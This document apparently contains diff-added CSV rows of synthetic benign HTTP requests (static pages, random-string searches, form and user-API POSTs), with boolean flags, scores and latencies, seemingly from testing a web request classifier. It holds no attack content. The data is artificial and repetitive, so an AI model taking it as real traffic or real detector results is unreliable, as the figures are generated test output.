+Benign #717,POST /form data=99,True,0.8849890491343497,False,146.978
+Benign #718,GET /search?q=EjOpMmhfQRIIRbqlD,False,0.17001095086565038,False,136.73
+Benign #719,POST /api/users/915,True,0.6749890491343497,False,191.099
+Benign #720,GET /search?q=edxJwVhLFHvb,False,0.17001095086565038,False,122.61
+Benign #721,POST /form data=24,True,0.8199890491343497,False,167.326
+Benign #722,GET /services.html,True,0.7199890491343497,False,171.178
+Benign #723,GET /contact.html,True,0.7849890491343496,False,162.661
+Benign #724,GET /search?q=otSyMN,True,0.7399890491343497,False,156.743
+Benign #725,GET /search?q=VjxigTC,True,0.7199890491343497,False,141.328
+Benign #726,POST /api/users/112,True,0.7349890491343496,False,154.387
+Benign #727,POST /form data=18,True,0.8199890491343497,False,158.869
+Benign #728,GET /search?q=JDQUOebJDOmiKZ ,False,0.16501095086565037,False,148.196
+Benign #729,POST /api/users/930,True,0.6749890491343497,False,132.544
+Benign #730,GET /search?q=pQsIMBSytXV,False,0.17001095086565038,False,138.709
+Benign #731,POST /form data=34,True,0.8199890491343497,False,134.741
+Benign #732,POST /form data=55,True,0.8849890491343497,False,163.798
+Benign #733,GET /products.html,True,0.7149890491343497,False,133.719
+Benign #734,POST /form data=40,True,0.8199890491343497,False,112.534
+Benign #735,POST /form data=49,True,0.8199890491343497,False,125.455
+Benign #736,POST /api/users/848,True,0.7349890491343496,False,130.194
+Benign #737,GET /about.html,True,0.7599890491343497,False,134.449
+Benign #738,POST /api/users/158,True,0.6749890491343497,False,136.248
+Benign #739,GET /services.html,True,0.7199890491343497,False,135.996
+Benign #740,GET /products.html,True,0.7149890491343497,False,143.552
+Benign #741,POST /api/users/428,True,0.6749890491343497,False,124.912
+Benign #742,GET /search?q=IcZtnJAGg,True,0.7149890491343497,False,149.308
+Benign #743,GET /contact.html,True,0.7849890491343496,False,137.999
+Benign #744,POST /api/users/209,True,0.6749890491343497,False,135.489
+Benign #745,POST /form data=71,True,0.8199890491343497,False,157.441
+Benign #746,POST /form data=92,True,0.8199890491343497,False,167.183
+Benign #747,GET /contact.html,True,0.7849890491343496,False,133.33
+Benign #748,GET /search?q=xfObCea,True,0.7249890491343497,False,131.74
+Benign #749,GET /search?q=WIvNNugznN,False,0.17001095086565038,False,171.165
+Benign #750,POST /form data=77,True,0.8849890491343497,False,139.25
+Benign #751,GET /products.html,True,0.7149890491343497,False,145.059
+Benign #752,POST /api/users/836,True,0.6749890491343497,False,144.158
+Benign #753,POST /api/users/634,True,0.6749890491343497,False,147.235
+Benign #754,POST /form data=90,True,0.8199890491343497,False,121.974
+Benign #755,POST /form data=42,True,0.8199890491343497,False,101.065
+Benign #756,GET /services.html,True,0.7199890491343497,False,132.078
+Benign #757,POST /form data=28,True,0.8199890491343497,False,136.717
+Benign #758,POST /form data=82,True,0.8199890491343497,False,135.911
+Benign #759,GET /products.html,True,0.7149890491343497,False,127.943
+Benign #760,GET /search?q=RDme E,True,0.7499890491343497,False,137.805
+Benign #761,POST /form data=38,True,0.8199890491343497,False,149.098
+Benign #762,GET /about.html,True,0.7599890491343497,False,140.077
+Benign #763,POST /form data=68,True,0.8199890491343497,False,132.223
+Benign #764,GET /search?q=WIQFKVMhUCXdWlWEfxMk,False,0.16501095086565037,False,140.868
+Benign #765,POST /api/users/938,True,0.6749890491343497,False,139.784
+Benign #766,POST /api/users/223,True,0.7349890491343496,False,139.602
+Benign #767,POST /api/users/131,True,0.7349890491343496,False,145.992
+Benign #768,GET /about.html,True,0.7599890491343497,False,186.595
+Benign #769,GET /search?q=jPHzMUAcMBCY,False,0.17001095086565038,False,158.74
+Benign #770,GET /about.html,True,0.7599890491343497,False,141.248
+Benign #771,POST /form data=36,True,0.8199890491343497,False,171.125
+Benign #772,POST /form data=62,True,0.8199890491343497,False,168.219
+Benign #773,GET /home.html,True,0.7949890491343496,False,144.821
+Benign #774,GET /contact.html,True,0.7849890491343496,False,146.737
+Benign #775,GET /search?q=mdfAsBDTIDSWNklIP,False,0.17001095086565038,False,144.153
+Benign #776,GET /search?q=viqTcYeklbieHsag,False,0.16501095086565037,False,133.429
+Benign #777,POST /form data=46,True,0.8199890491343497,False,138.098
+Benign #778,GET /search?q=XjLgs,True,0.7499890491343497,False,150.736
+Benign #779,GET /search?q=ZiOWeLhPMeZEUYTgXrT,False,0.16501095086565037,False,134.583
+Benign #780,GET /services.html,True,0.7199890491343497,False,141.437
+Benign #781,GET /services.html,True,0.7199890491343497,False,129.047
+Benign #782,POST /api/users/375,True,0.6749890491343497,False,125.553
+Benign #783,POST /form data=56,True,0.8199890491343497,False,168.992
+Benign #784,POST /form data=27,True,0.8199890491343497,False,139.928
+Benign #785,GET /services.html,True,0.7199890491343497,False,137.171
+Benign #786,POST /api/users/639,True,0.6749890491343497,False,121.488
+Benign #787,GET /search?q= RSjv,True,0.7499890491343497,False,172.209
+Benign #788,POST /form data=98,True,0.8199890491343497,False,153.941
+Benign #789,GET /about.html,True,0.7599890491343497,False,151.167
+Benign #790,GET /search?q=EqUqeTedPZ,False,0.18501095086565036,False,193.343
+Benign #791,POST /form data=76,True,0.8199890491343497,False,167.959
+Benign #792,GET /home.html,True,0.7949890491343496,False,126.924
+Benign #793,POST /form data=20,True,0.8199890491343497,False,152.008
+Benign #794,POST /api/users/66,True,0.7449890491343496,False,157.383
+Benign #795,GET /services.html,True,0.7199890491343497,False,175.011
+Benign #796,GET /contact.html,True,0.7849890491343496,False,121.147
+Benign #797,POST /api/users/914,True,0.6749890491343497,False,130.153
+Benign #798,GET /search?q=ltMvsLSH,True,0.7149890491343497,False,125.266
+Benign #799,GET /contact.html,True,0.7849890491343496,False,128.297
+Benign #800,GET /search?q=rmAQiejhvLdaqoOsfPsN,False,0.16501095086565037,False,124.103
+Benign #801,GET /products.html,True,0.7149890491343497,False,134.816
+Benign #802,POST /api/users/567,True,0.6749890491343497,False,146.327
+Benign #803,POST /api/users/277,True,0.7349890491343496,False,122.834
+Benign #804,GET /search?q=zsUbwaRzxpLxcPJSMoG,False,0.16501095086565037,False,130.94
+Benign #805,POST /api/users/579,True,0.6749890491343497,False,149.593
+Benign #806,GET /search?q=qqQEG,True,0.8149890491343497,False,158.622
+Benign #807,GET /services.html,True,0.7199890491343497,False,148.715
+Benign #808,GET /home.html,True,0.7949890491343496,False,150.056
+Benign #809,GET /search?q=WRfJqEqXrfwyTDE,False,0.16501095086565037,False,143.728
+Benign #810,GET /services.html,True,0.7199890491343497,False,139.907
+Benign #811,GET /search?q=jFkjVWJ hFaIwz,False,0.17001095086565038,False,175.596
+Benign #812,POST /form data=21,True,0.8199890491343497,False,184.394
+Benign #813,GET /home.html,True,0.7949890491343496,False,124.402
+Benign #814,GET /search?q=fQnuMEGwVoFzADhyhFZL,False,0.16501095086565037,False,135.558
+Benign #815,GET /search?q=kKNJoAzwUVXRwYkDyI,False,0.17001095086565038,False,152.428
+Benign #816,POST /form data=57,True,0.8199890491343497,False,132.208
+Benign #817,GET /search?q=U EpLclreMardBVzu,False,0.17001095086565038,False,129.369
+Benign #818,POST /form data=4,True,0.8799890491343496,False,126.127
+Benign #819,GET /search?q=sRQhjW,True,0.7499890491343497,False,138.829
+Benign #820,GET /search?q=pXEuHjTitivIOxqBQXcL,False,0.16501095086565037,False,134.871
+Benign #821,POST /form data=72,True,0.8199890491343497,False,138.564
+Benign #822,POST /form data=59,True,0.8199890491343497,False,144.103
+Benign #823,POST /form data=30,True,0.8199890491343497,False,135.709
+Benign #824,POST /form data=12,True,0.8199890491343497,False,146.469
+Benign #825,GET /services.html,True,0.7199890491343497,False,124.462
+Benign #826,GET /search?q=vMkRUeykTWLVFfKu,False,0.16501095086565037,False,130.537
+Benign #827,POST /api/users/286,True,0.6749890491343497,False,144.304
+Benign #828,GET /search?q=anhhhmVaCLLvPl,False,0.18001095086565036,False,148.052
+Benign #829,POST /api/users/282,True,0.7349890491343496,False,132.499
+Benign #830,GET /contact.html,True,0.7849890491343496,False,137.793
+Benign #831,POST /form data=35,True,0.8199890491343497,False,160.439
+Benign #832,POST /form data=24,True,0.8199890491343497,False,144.888
+Benign #833,GET /search?q=pXvrJiTD,True,0.7199890491343497,False,153.272
+Benign #834,POST /api/users/180,True,0.6749890491343497,False,176.978
+Benign #835,GET /home.html,True,0.7949890491343496,False,140.124
+Benign #836,GET /home.html,True,0.7949890491343496,False,176.314
+Benign #837,GET /search?q=krXbrHnaGWzJZJkIC,False,0.17001095086565038,False,130.574
+Benign #838,GET /contact.html,True,0.7849890491343496,False,144.199
+Benign #839,POST /form data=99,True,0.8849890491343497,False,145.568
+Benign #840,GET /search?q=OmhuzCURFtUhk,False,0.17001095086565038,False,133.656
+Benign #841,GET /about.html,True,0.7599890491343497,False,143.68
+Benign #842,POST /form data=73,True,0.8199890491343497,False,138.632
+Benign #843,GET /services.html,True,0.7199890491343497,False,145.898
+Benign #844,POST /api/users/679,True,0.6749890491343497,False,129.177
+Benign #845,GET /search?q=paggwqknb,True,0.7199890491343497,False,135.398
+Benign #846,GET /products.html,True,0.7149890491343497,False,149.23
+Benign #847,GET /products.html,True,0.7149890491343497,False,130.026
+Benign #848,POST /api/users/132,True,0.6749890491343497,False,116.697
+Benign #849,POST /form data=4,True,0.8799890491343496,False,120.741
+Benign #850,POST /api/users/562,True,0.6749890491343497,False,138.115
+Benign #851,GET /about.html,True,0.7599890491343497,False,114.102
+Benign #852,GET /products.html,True,0.7149890491343497,False,140.213
+Benign #853,POST /form data=20,True,0.8199890491343497,False,158.789
+Benign #854,POST /api/users/473,True,0.6749890491343497,False,118.088
+Benign #855,GET /search?q=wbjwvDjx N,False,0.17001095086565038,False,143.51
+Benign #856,GET /search?q=ZGJMQyszLJyqy,False,0.18001095086565036,False,128.449
+Benign #857,POST /form data=90,True,0.8199890491343497,False,123.552
+Benign #858,POST /form data=26,True,0.8199890491343497,False,123.939
+Benign #859,GET /products.html,True,0.7149890491343497,False,122.537
+Benign #860,POST /form data=66,True,0.8849890491343497,False,128.173
+Benign #861,POST /form data=55,True,0.8849890491343497,False,131.655
+Benign #862,POST /api/users/655,True,0.7349890491343496,False,144.71
+Benign #863,POST /api/users/151,True,0.7349890491343496,False,124.244
+Benign #864,GET /search?q=iJtiuJsmBwlsN zgf,False,0.17001095086565038,False,129.255
+Benign #865,POST /api/users/63,True,0.7349890491343496,False,130.646
+Benign #866,GET /home.html,True,0.7949890491343496,False,131.636
+Benign #867,GET /products.html,True,0.7149890491343497,False,134.248
+Benign #868,GET /search?q=k dTwwfDbGTtIWb,False,0.16501095086565037,False,123.607
+Benign #869,GET /search?q=UFKMzuPCopxD,False,0.17001095086565038,False,143.078
+Benign #870,GET /search?q=YIxpFhxet,True,0.7199890491343497,False,136.881
+Benign #871,POST /form data=89,True,0.8199890491343497,False,134.16
+Benign #872,GET /about.html,True,0.7599890491343497,False,129.4
+Benign #873,GET /products.html,True,0.7149890491343497,False,125.035
+Benign #874,GET /search?q=LJOiV,True,0.7449890491343496,False,165.733
+Benign #875,POST /api/users/350,True,0.6749890491343497,False,118.307
+Benign #876,GET /search?q=KffEpHeztjFcVRyjsj,False,0.17001095086565038,False,136.739
+Benign #877,GET /search?q=hEItRUJBTW,False,0.17001095086565038,False,138.601
+Benign #878,POST /api/users/654,True,0.6749890491343497,False,135.045
+Benign #879,POST /form data=2,True,0.8799890491343496,False,127.027
+Benign #880,POST /api/users/581,True,0.6749890491343497,False,126.168
+Benign #881,POST /form data=71,True,0.8199890491343497,False,132.427
+Benign #882,GET /services.html,True,0.7199890491343497,False,123.215
+Benign #883,POST /form data=53,True,0.8199890491343497,False,129.505
+Benign #884,GET /about.html,True,0.7599890491343497,False,125.508
+Benign #885,GET /search?q=mUQMigkzMPzaDbtK,False,0.16501095086565037,False,129.969
+Benign #886,POST /api/users/138,True,0.6749890491343497,False,131.538
+Benign #887,POST /form data=9,True,0.8799890491343496,False,141.132
+Benign #888,GET /about.html,True,0.7599890491343497,False,131.047
+Benign #889,GET /products.html,True,0.7149890491343497,False,126.923
+Benign #890,POST /form data=66,True,0.8849890491343497,False,128.804
+Benign #891,POST /form data=34,True,0.8199890491343497,False,198.941
+Benign #892,POST /api/users/131,True,0.7349890491343496,False,120.758
+Benign #893,GET /search?q=hcDSLVaIxOfBQhea,False,0.16501095086565037,False,104.309
+Benign #894,POST /form data=26,True,0.8199890491343497,False,194.317
+Benign #895,GET /home.html,True,0.7949890491343496,False,126.944
+Benign #896,GET /search?q=PveSlNL YsGL,False,0.17001095086565038,False,156.095
+Benign #897,POST /api/users/889,True,0.7349890491343496,False,137.102
+Benign #898,POST /api/users/663,True,0.7349890491343496,False,127.679
+Benign #899,POST /api/users/430,True,0.6749890491343497,False,114.436
+Benign #900,POST /api/users/272,True,0.7349890491343496,False,106.373
+Benign #901,GET /search?q=QsSijLRNnDJrUD PKBBb,False,0.16501095086565037,False,126.001
+Benign #902,GET /search?q=JxTTFSNc obeflO,False,0.16501095086565037,False,140.05
+Benign #903,GET /contact.html,True,0.7849890491343496,False,174.689
+Benign #904,POST /form data=44,True,0.8849890491343497,False,130.698
+Benign #905,POST /form data=39,True,0.8199890491343497,False,135.742
+Benign #906,POST /api/users/621,True,0.6749890491343497,False,132.328
+Benign #907,POST /api/users/242,True,0.7349890491343496,False,133.081
+Benign #908,GET /search?q=BncZgY,True,0.7499890491343497,False,127.927
+Benign #909,POST /form data=98,True,0.8199890491343497,False,122.081
+Benign #910,POST /api/users/666,True,0.7499890491343497,False,149.312
+Benign #911,GET /products.html,True,0.7149890491343497,False,153.693
+Benign #912,GET /contact.html,True,0.7849890491343496,False,137.055
+Benign #913,GET /about.html,True,0.7599890491343497,False,136.616
+Benign #914,POST /form data=92,True,0.8199890491343497,False,133.793
+Benign #915,POST /api/users/64,True,0.7349890491343496,False,122.922
+Benign #916,GET /contact.html,True,0.7849890491343496,False,118.085
+Benign #917,POST /form data=24,True,0.8199890491343497,False,172.647
+Benign #918,POST /form data=29,True,0.8199890491343497,False,164.652
+Benign #919,POST /form data=18,True,0.8199890491343497,False,116.125
+Benign #920,POST /form data=70,True,0.8199890491343497,False,120.277
+Benign #921,GET /search?q=rxQbW,True,0.7499890491343497,False,158.98
+Benign #922,GET /home.html,True,0.7949890491343496,False,110.59
+Benign #923,GET /search?q=FaiY G,True,0.7499890491343497,False,129.259
+Benign #924,POST /form data=80,True,0.8199890491343497,False,127.683
+Benign #925,POST /api/users/306,True,0.6749890491343497,False,128.526
+Benign #926,POST /form data=19,True,0.8199890491343497,False,130.99
+Benign #927,POST /form data=50,True,0.8199890491343497,False,130.271
+Benign #928,POST /api/users/269,True,0.6749890491343497,False,110.258
+Benign #929,POST /api/users/517,True,0.6749890491343497,False,125.003
+Benign #930,POST /form data=85,True,0.8199890491343497,False,135.467
+Benign #931,GET /services.html,True,0.7199890491343497,False,121.874
+Benign #932,POST /api/users/858,True,0.7349890491343496,False,126.34
+Benign #933,GET /search?q=cSFq jUTRtAl,False,0.17001095086565038,False,125.718
+Benign #934,POST /api/users/897,True,0.6749890491343497,False,129.617
+Benign #935,GET /search?q=cWRiecbAjjaJVr,False,0.17001095086565038,False,135.923
+Benign #936,GET /search?q=PQZb NkAogM,False,0.17001095086565038,False,148.148
+Benign #937,GET /contact.html,True,0.7849890491343496,False,219.33
+Benign #938,GET /about.html,True,0.7599890491343497,False,172.208
+Benign #939,GET /search?q=eBxwEQwseSFd,False,0.18001095086565036,False,119.013
+Benign #940,POST /form data=88,True,0.8849890491343497,False,311.475
+Benign #941,POST /api/users/553,True,0.7349890491343496,False,109.795
+Benign #942,GET /search?q=vSDmiLj,True,0.7149890491343497,False,136.34
+Benign #943,POST /api/users/756,True,0.6749890491343497,False,133.375
+Benign #944,GET /search?q=ouMMPvfiRou,False,0.17001095086565038,False,131.474
+Benign #945,POST /api/users/541,True,0.6749890491343497,False,131.41
+Benign #946,POST /form data=2,True,0.8799890491343496,False,130.021
+Benign #947,POST /api/users/571,True,0.6749890491343497,False,123.97
+Benign #948,GET /about.html,True,0.7599890491343497,False,122.218
+Benign #949,POST /api/users/456,True,0.6749890491343497,False,116.962
+Benign #950,POST /api/users/285,True,0.6749890491343497,False,121.57
+Benign #951,POST /form data=19,True,0.8199890491343497,False,126.719
+Benign #952,GET /search?q=ahSNkgfSJSEFVm,False,0.17001095086565038,False,157.135
+Benign #953,POST /form data=4,True,0.8799890491343496,False,118.237
+Benign #954,GET /search?q=MKGZOuitFnIKE,False,0.17001095086565038,False,130.875
+Benign #955,GET /search?q=oqyfssfVlsqbkENhLjsu,False,0.16501095086565037,False,126.948
+Benign #956,POST /api/users/661,True,0.7349890491343496,False,137.237
+Benign #957,GET /home.html,True,0.7949890491343496,False,143.123
+Benign #958,POST /form data=92,True,0.8199890491343497,False,137.795
+Benign #959,GET /contact.html,True,0.7849890491343496,False,157.042
+Benign #960,GET /search?q=usuxqgsrbsXPATc,False,0.17501095086565036,False,159.733
+Benign #961,GET /products.html,True,0.7149890491343497,False,134.032
+Benign #962,GET /about.html,True,0.7599890491343497,False,206.944
+Benign #963,GET /products.html,True,0.7149890491343497,False,150.817
+Benign #964,GET /home.html,True,0.7949890491343496,False,129.966
+Benign #965,POST /form data=82,True,0.8199890491343497,False,133.937
+Benign #966,GET /contact.html,True,0.7849890491343496,False,136.869
+Benign #967,POST /api/users/974,True,0.6749890491343497,False,130.51
+Benign #968,GET /search?q=NrBBhwCjDelfZSJPTQ,False,0.17001095086565038,False,150.369
+Benign #969,POST /api/users/747,True,0.7349890491343496,False,142.521
+Benign #970,GET /search?q=mBzFuUSaGRDYf,False,0.17001095086565038,False,169.275
+Benign #971,POST /form data=96,True,0.8199890491343497,False,161.788
+Benign #972,GET /search?q=NPtlUadebFjILrl,False,0.16501095086565037,False,255.021
+Benign #973,POST /form data=27,True,0.8199890491343497,False,149.617
+Benign #974,GET /products.html,True,0.7149890491343497,False,143.533
+Benign #975,GET /services.html,True,0.7199890491343497,False,134.559
+Benign #976,POST /form data=93,True,0.8199890491343497,False,153.47
+Benign #977,POST /api/users/530,True,0.6749890491343497,False,144.028
+Benign #978,GET /contact.html,True,0.7849890491343496,False,147.089
+Benign #979,POST /form data=7,True,0.8799890491343496,False,137.113
+Benign #980,GET /search?q=fwMqpGzwNlEHtQ,False,0.17001095086565038,False,145.809
+Benign #981,POST /api/users/770,True,0.7349890491343496,False,167.181
+Benign #982,POST /api/users/455,True,0.7349890491343496,False,139.812
+Benign #983,GET /search?q=gvGJWNguAEnPjV,False,0.17001095086565038,False,138.289
+Benign #984,POST /form data=54,True,0.8199890491343497,False,142.4
+Benign #985,POST /api/users/973,True,0.6749890491343497,False,140.561
+Benign #986,GET /home.html,True,0.7949890491343496,False,137.919
+Benign #987,GET /home.html,True,0.7949890491343496,False,145.673
+Benign #988,POST /form data=73,True,0.8199890491343497,False,146.226
+Benign #989,POST /api/users/354,True,0.6749890491343497,False,147.809
+Benign #990,POST /api/users/232,True,0.7349890491343496,False,140.446
+Benign #991,POST /form data=67,True,0.8199890491343497,False,140.429
+Benign #992,POST /form data=70,True,0.8199890491343497,False,148.822
+Benign #993,GET /search?q=OqlRNQPoKaVWttx,False,0.16501095086565037,False,169.422
+Benign #994,GET /search?q=nY qYaeLT WNayY,False,0.18001095086565036,False,140.17
+Benign #995,GET /products.html,True,0.7149890491343497,False,126.388
+Benign #996,GET /about.html,True,0.7599890491343497,False,142.525
+Benign #997,POST /api/users/203,True,0.6749890491343497,False,142.729
+Benign #998,POST /form data=13,True,0.8199890491343497,False,149.817
+Benign #999,GET /contact.html,True,0.7849890491343496,False,134.842
+Benign #1000,GET /home.html,True,0.7949890491343496,False,121.276
